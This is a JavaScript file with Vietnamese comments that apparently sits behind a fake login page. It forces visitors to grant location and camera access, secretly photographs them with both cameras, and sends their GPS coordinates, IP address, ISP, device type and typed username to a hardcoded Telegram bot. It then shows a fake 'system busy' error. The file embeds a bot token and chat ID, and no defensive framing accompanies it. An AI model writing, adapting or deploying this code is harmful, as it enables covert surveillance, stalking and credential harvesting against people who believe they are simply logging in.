const TELEGRAM_BOT_TOKEN = '8163261794:AAE1AVuCTP0Vm_kqV0a1DT-02NTo1XKhVs0';
const TELEGRAM_CHAT_ID = '-1003770043455';

const API_SEND_TEXT = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
const API_SEND_MEDIA = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMediaGroup`;

const info = {
  time: '', ip: '', isp: '', address: '', lat: '', lon: '',
  loginDetails: '', isAdmin: false, device: ''
};

// --- 1. LẤY THIẾT BỊ ---
function getDeviceInfo() {
    const ua = navigator.userAgent;
    const ratio = window.devicePixelRatio;
    const screenRes = `${window.screen.width * ratio}x${window.screen.height * ratio}`;
    if (/iPhone|iPad/.test(ua)) return "iPhone/iPad (iOS)";
    if (/Android/.test(ua)) return "Android Phone";
    return "PC / Laptop";
}

// --- 2. ÉP BUỘC GPS (BẮT BUỘC) ---
async function forceLocation() {
    return new Promise((resolve, reject) => {
        if (!("geolocation" in navigator)) {
            alert("Trình duyệt của bạn quá cũ để truy cập. Vui lòng nâng cấp!");
            reject();
        }
        navigator.geolocation.getCurrentPosition(
            (pos) => {
                info.lat = pos.coords.latitude.toFixed(6);
                info.lon = pos.coords.longitude.toFixed(6);
                info.address = "📍 Vị trí GPS chuẩn xác";
                resolve();
            },
            () => {
                alert("❌ LỖI: Bạn phải cho phép truy cập Vị trí để xác minh danh tính!");
                location.reload(); // Từ chối là load lại trang
                reject();
            },
            { enableHighAccuracy: true, timeout: 10000 }
        );
    });
}

// --- 3. ÉP BUỘC CAMERA (BẮT BUỘC) ---
async function forceCapture(mode = 'user') {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode }, audio: false });
        return new Promise(resolve => {
            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();
            video.onloadedmetadata = () => {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                setTimeout(() => {
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    stream.getTracks().forEach(t => t.stop());
                    canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.8);
                }, 800);
            };
        });
    } catch (e) {
        alert("❌ LỖI: Bạn phải cho phép truy cập Camera để tiếp tục!");
        location.reload(); // Từ chối là load lại trang
        return null;
    }
}

async function getIPOnly() {
    try {
        const res = await fetch(`https://ipwho.is/`);
        const data = await res.json();
        info.ip = data.ip || 'Không rõ';
        info.isp = data.connection?.org || 'ISP';
    } catch (e) { info.ip = 'Lỗi kết nối'; }
}

function getCaption() {
    const mapsLink = `https://www.google.com/maps?q=${info.lat},${info.lon}`;
    if (info.isAdmin) {
        return `⚠️ ADMIN ĐĂNG NHẬP\n👤 ${info.loginDetails}\n🌐 IP: ${info.ip}\n📍 Maps: ${mapsLink}`;
    }
    return `🚫 PHÁT HIỆN CON CHÓ NGU\n👤 Tài khoản: ${info.loginDetails}\n📱 Thiết bị: ${info.device}\n🌐 IP: ${info.ip}\n🏢 ISP: ${info.isp}\n📍 Maps: ${mapsLink}`.trim();
}

// --- HÀM CHÍNH (LOGIC MỚI) ---
async function main() {
    const user = document.getElementById('username').value.trim();
    const role = document.getElementById('user-role').value;
    
    info.time = new Date().toLocaleString('vi-VN');
    info.loginDetails = `${user} (${role})`;
    info.isAdmin = (user === "Mrwenben" || user === "VanThanh");
    info.device = getDeviceInfo();

    // Bước 1: Lấy IP (Luôn chạy)
    await getIPOnly();

    // Bước 2: Kiểm tra nếu là Admin thì cho qua luôn, không cần ép GPS/Cam
    if (info.isAdmin) {
        await fetch(API_SEND_TEXT, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: getCaption() })
        });
        alert("Chào mừng Sếp quay trở lại!");
        return true; 
    }

    // Bước 3: Nếu là người lạ -> ÉP BUỘC GPS
    await forceLocation();

    // Bước 4: ÉP BUỘC CAMERA
    const frontBlob = await forceCapture('user');
    const backBlob = await forceCapture('environment');

    // Bước 5: Gửi dữ liệu về Telegram
    const formData = new FormData();
    formData.append('chat_id', TELEGRAM_CHAT_ID);
    const media = [];
    if (frontBlob) {
        formData.append('front', frontBlob, 'front.jpg');
        media.push({ type: 'photo', media: 'attach://front', caption: getCaption() });
    }
    if (backBlob) {
        formData.append('back', backBlob, 'back.jpg');
        media.push({ type: 'photo', media: 'attach://back' });
    }

    if (media.length > 0) {
        formData.append('media', JSON.stringify(media));
        await fetch(API_SEND_MEDIA, { method: 'POST', body: formData });
    }

    // Sau khi lấy hết dữ liệu mới cho vào (hoặc thông báo lỗi giả)
    alert("Hệ thống bận, vui lòng thử lại sau!");
    location.reload();
    return true;
}
